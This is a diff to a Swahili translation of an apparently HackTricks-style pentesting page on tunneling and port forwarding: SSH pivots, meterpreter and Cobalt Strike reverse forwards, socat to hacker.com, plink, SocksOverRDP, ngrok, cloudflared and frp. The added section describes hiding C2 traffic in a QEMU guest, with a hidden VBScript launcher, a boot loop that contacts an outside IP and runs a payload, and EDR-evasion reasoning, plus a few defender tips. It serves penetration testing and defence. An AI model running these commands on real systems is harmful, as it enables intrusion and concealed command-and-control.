@@ -51,7 +51,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```
 ### Port2hostnet (proxychains)
 
-Local Port --> Compromised host (SSH) --> Popote
+Porti za ndani --> Kituo kilichovunjwa (SSH) --> Popote
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
@@ -89,12 +89,12 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Usalama – Shambulio la Terrapin (CVE-2023-48795)**
-> Shambulio la kupunguza la Terrapin la mwaka 2023 linaweza kumruhusu mtu katikati kuingilia kati mkutano wa awali wa SSH na kuingiza data katika **kila channel iliyosambazwa** ( `-L`, `-R`, `-D` ). Hakikisha mteja na seva zote zimepatishwa (**OpenSSH ≥ 9.6/LibreSSH 6.7**) au wazi wazi zima algorithimu dhaifu `chacha20-poly1305@openssh.com` na `*-etm@openssh.com` katika `sshd_config`/`ssh_config` kabla ya kutegemea SSH tunnels.
+> Shambulio la kupunguza Terrapin la mwaka 2023 linaweza kumruhusu mtu katikati kuingilia kati mkutano wa awali wa SSH na kuingiza data katika **kitu chochote kilichosambazwa** ( `-L`, `-R`, `-D` ). Hakikisha mteja na seva zote zimepatishwa (**OpenSSH ≥ 9.6/LibreSSH 6.7**) au wazi wazi zima algorithimu hatarishi `chacha20-poly1305@openssh.com` na `*-etm@openssh.com` katika `sshd_config`/`ssh_config` kabla ya kutegemea SSH tunnels.
 
 ## SSHUTTLE
 
-Unaweza **tunnel** kupitia **ssh** kila **trafiki** kwenda **subnetwork** kupitia mwenyeji.\
-Kwa mfano, kusambaza kila trafiki inayokwenda 10.10.10.0/24
+Unaweza **kufanya tunneling** kupitia **ssh** kwa ajili ya **trafiki** yote kwenda kwenye **subnetwork** kupitia mwenyeji.\
+Kwa mfano, kusambaza trafiki yote inayokwenda 10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -108,7 +108,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Local port --> Compromised host (active session) --> Third_box:Port
+Porti za ndani --> Kituo kilichovunjwa (kipindi kinachofanya kazi) --> Sanduku_tatu:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -154,10 +154,10 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-Ili kuzingatia:
+To note:
 
-- Reverse port forward ya Beacon imeundwa ili **kufanya tunneling ya trafiki kwa Team Server, sio kwa kuhamasisha kati ya mashine binafsi**.
-- Trafiki **inafanywa tunneling ndani ya trafiki ya C2 ya Beacon**, ikiwa ni pamoja na viungo vya P2P.
+- Reverse port forward ya Beacon imeundwa ili **kufanya tunnel trafiki kwa Team Server, sio kwa kuhamasisha kati ya mashine binafsi**.
+- Trafiki **inafanywa tunnel ndani ya trafiki ya C2 ya Beacon**, ikiwa ni pamoja na viungo vya P2P.
 - **Haki za Admin hazihitajiki** kuunda reverse port forwards kwenye bandari za juu.
 
 ### rPort2Port local
@@ -223,7 +223,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Kuweka na Kusikiliza kwa Wakala
+### Ufunguo wa Wakala na Kusikiliza
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -290,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Unaweza kupita **proxy isiyo na uthibitisho** ukitekeleza mstari huu badala ya ule wa mwisho kwenye konso ya mwathirika:
+Unaweza kupita **proxy isiyo na uthibitisho** ukitekeleza mstari huu badala ya wa mwisho kwenye konso ya mwathirika:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -324,7 +324,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 Ni kama toleo la console la PuTTY (chaguzi ni sawa na mteja wa ssh).
 
-Kwa kuwa hii binary itatekelezwa kwenye mwathirika na ni mteja wa ssh, tunahitaji kufungua huduma yetu ya ssh na bandari ili tuweze kuwa na muunganisho wa kurudi. Kisha, ili kupeleka tu bandari inayoweza kufikiwa ndani kwa bandari kwenye mashine yetu:
+Kwa kuwa hii binary itatekelezwa kwenye mwathirika na ni mteja wa ssh, tunahitaji kufungua huduma yetu ya ssh na bandari ili tuweze kuwa na muunganisho wa kurudi. Kisha, ili kuhamasisha bandari inayopatikana tu kwa ndani kwa bandari kwenye mashine yetu:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -348,7 +348,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Unahitaji kuwa na **ufikiaji wa RDP juu ya mfumo**.\
 Pakua:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Chombo hiki kinatumia `Dynamic Virtual Channels` (`DVC`) kutoka kwa kipengele cha Huduma ya Desktop ya KijRemote ya Windows. DVC inawajibika kwa **kuchora pakiti juu ya muunganisho wa RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Chombo hiki kinatumia `Dynamic Virtual Channels` (`DVC`) kutoka kwa kipengele cha Huduma ya Desktop ya K remote ya Windows. DVC inawajibika kwa **kuchora pakiti juu ya muunganisho wa RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 Katika kompyuta yako ya mteja, pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavyo:
@@ -356,13 +356,13 @@ Katika kompyuta yako ya mteja, pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavy
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Sasa tunaweza **kuunganisha** na **mhasiriwa** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **kipeperushi** kinachosema kwamba **SocksOverRDP plugin imewezeshwa**, na itakuwa **inaskiliza** kwenye **127.0.0.1:1080**.
+Sasa tunaweza **kuunganisha** na **mhasiriwa** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **kiashiria** kinachosema kwamba **SocksOverRDP plugin imewezeshwa**, na itakuwa **inaskiliza** kwenye **127.0.0.1:1080**.
 
 **Unganisha** kupitia **RDP** na pakia & tekeleza kwenye mashine ya mhasiriwa `SocksOverRDP-Server.exe` binary:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Sasa, thibitisha kwenye mashine yako (mshambuliaji) kwamba bandari 1080 inasikiliza:
+Sasa, thibitisha katika mashine yako (mshambuliaji) kwamba bandari 1080 inasikiliza:
 ```
 netstat -antb | findstr 1080
 ```
@@ -444,7 +444,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Badilisha DNS ya proxychains
 
-Proxychains inakamata `gethostbyname` libc call na inatunga ombi la tcp DNS kupitia socks proxy. Kwa **kawaida** seva ya **DNS** ambayo proxychains inatumia ni **4.2.2.2** (imeandikwa kwa nguvu). Ili kubadilisha, hariri faili: _/usr/lib/proxychains3/proxyresolv_ na ubadilishe IP. Ikiwa uko katika **mazingira ya Windows** unaweza kuweka IP ya **meneja wa kikoa**.
+Proxychains inakamata `gethostbyname` libc call na inatunga ombi la tcp DNS kupitia socks proxy. Kwa **kawaida** seva ya **DNS** ambayo proxychains inatumia ni **4.2.2.2** (imeandikwa kwa nguvu). Ili kuibadilisha, hariri faili: _/usr/lib/proxychains3/proxyresolv_ na ubadilishe IP. Ikiwa uko katika **mazingira ya Windows** unaweza kuweka IP ya **meneja wa kikoa**.
 
 ## Tunnels katika Go
 
@@ -498,7 +498,7 @@ chmod a+x ./ngrok
 
 **Hati:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-_Ipo pia uwezekano wa kuongeza uthibitisho na TLS, ikiwa ni lazima._
+_Pia inawezekana kuongeza uthibitisho na TLS, ikiwa ni lazima._
 
 #### Tunneling TCP
 ```bash
@@ -572,11 +572,11 @@ Anza kiunganishi:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Kwa sababu trafiki yote inatoka kwenye mwenyeji **nje kupitia 443**, Cloudflared tunnels ni njia rahisi ya kupita ACLs za kuingia au mipaka ya NAT. Kuwa makini kwamba binary kawaida inafanya kazi na ruhusa za juu – tumia kontena au lippu `--user` inapowezekana.
+Kwa sababu trafiki yote inatoka kwenye mwenyeji **nje kupitia 443**, Cloudflared tunnels ni njia rahisi ya kupita ACLs za kuingia au mipaka ya NAT. Kuwa makini kwamba binary kawaida inafanya kazi na mamlaka ya juu – tumia kontena au lippu `--user` inapowezekana.
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) ni proxy ya nyuma ya Go inayosimamiwa kwa ufanisi ambayo inasaidia **TCP, UDP, HTTP/S, SOCKS na P2P NAT-hole-punching**. Kuanzia na **v0.53.0 (Mei 2024)** inaweza kutenda kama **SSH Tunnel Gateway**, hivyo mwenyeji wa lengo anaweza kuanzisha tunnel ya nyuma kwa kutumia tu mteja wa kawaida wa OpenSSH – hakuna binary ya ziada inahitajika.
+[`frp`](https://github.com/fatedier/frp) ni reverse-proxy ya Go inayosimamiwa kwa ufanisi ambayo inasaidia **TCP, UDP, HTTP/S, SOCKS na P2P NAT-hole-punching**. Kuanzia na **v0.53.0 (Mei 2024)** inaweza kutenda kama **SSH Tunnel Gateway**, hivyo mwenyeji wa lengo anaweza kuanzisha tunnel ya kurudi kwa kutumia tu mteja wa kawaida wa OpenSSH – hakuna binary ya ziada inahitajika.
 
 ### Classic reverse TCP tunnel
 ```bash
@@ -606,11 +606,69 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-Amri hapo juu inachapisha bandari ya mwathirika **8080** kama **attacker_ip:9000** bila kupeleka zana zozote za ziada – bora kwa pivoting ya kuishi kwenye ardhi.
+Amri hapo juu inachapisha bandari ya mwathirika **8080** kama **attacker_ip:9000** bila kupeleka zana za ziada – bora kwa pivoting ya kuishi kwenye ardhi.
+
+## Tunnels za Siri za VM kwa kutumia QEMU
+
+Mitandao ya hali ya mtumiaji ya QEMU (`-netdev user`) inasaidia chaguo kinachoitwa `hostfwd` ambacho **kinafunga bandari ya TCP/UDP kwenye *host* na kupeleka ndani ya *guest***. Wakati mgeni anapokimbia daemon kamili ya SSH, sheria ya hostfwd inakupa sanduku la kuruka la SSH linaloweza kutumika ambalo linaishi kabisa ndani ya VM ya muda – bora kwa kuficha trafiki ya C2 kutoka EDR kwa sababu shughuli zote mbaya na faili zinabaki kwenye diski ya virtual.
+
+### Mstari wa haraka
+```powershell
+# Windows victim (no admin rights, no driver install – portable binaries only)
+qemu-system-x86_64.exe ^
+-m 256M ^
+-drive file=tc.qcow2,if=ide ^
+-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
+-device e1000,netdev=n0 ^
+-nographic
+```
+• Amri hiyo inazindua picha ya **Tiny Core Linux** (`tc.qcow2`) katika RAM.  
+• Bandari **2222/tcp** kwenye mwenyeji wa Windows inasambazwa kwa uwazi kwa **22/tcp** ndani ya mgeni.  
+• Kutoka kwa mtazamo wa mshambuliaji, lengo linaonyesha tu bandari 2222; pakiti zozote zinazofikia hiyo zinashughulikiwa na seva ya SSH inayotembea katika VM.  
+
+### Kuzindua kwa siri kupitia VBScript
+```vb
+' update.vbs – lived in C:\ProgramData\update
+Set o = CreateObject("Wscript.Shell")
+o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
+```
+Kukimbia kwa script na `cscript.exe //B update.vbs` kunashikilia dirisha kuwa fiche.
+
+### Uthibitisho ndani ya mgeni
+
+Kwa sababu Tiny Core haina hali, washambuliaji kawaida:
+
+1. Weka payload kwenye `/opt/123.out`
+2. Ongeza kwenye `/opt/bootlocal.sh`:
+
+```sh
+while ! ping -c1 45.77.4.101; do sleep 2; done
+/opt/123.out
+```
+
+3. Ongeza `home/tc` na `opt` kwenye `/opt/filetool.lst` ili payload ipakizwe kwenye `mydata.tgz` wakati wa kuzima.
+
+### Kwa nini hii inakwepa kugunduliwa
+
+• Ni executable mbili tu zisizo na saini (`qemu-system-*.exe`) zinagusa diski; hakuna madereva au huduma zinazowekwa.
+• Bidhaa za usalama kwenye mwenyeji zinaona **trafiki ya loopback isiyo na madhara** (C2 halisi inamalizika ndani ya VM).
+• Scanner za kumbukumbu kamwe hazichambui nafasi ya mchakato mbaya kwa sababu inaishi katika OS tofauti.
+
+### Vidokezo vya Defender
+
+• Onya kuhusu **binaries zisizotarajiwa za QEMU/VirtualBox/KVM** katika njia zinazoweza kuandikwa na mtumiaji.
+• Zuia muunganisho wa nje unaotokana na `qemu-system*.exe`.
+• Tafuta port za kusikiliza zisizo za kawaida (2222, 10022, …) zinazofunga mara moja baada ya uzinduzi wa QEMU.
+
+---
 
 ## Zana nyingine za kuangalia
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 - [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+
+## Marejeleo
+
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
 
 {{#include ../banners/hacktricks-training.md}}
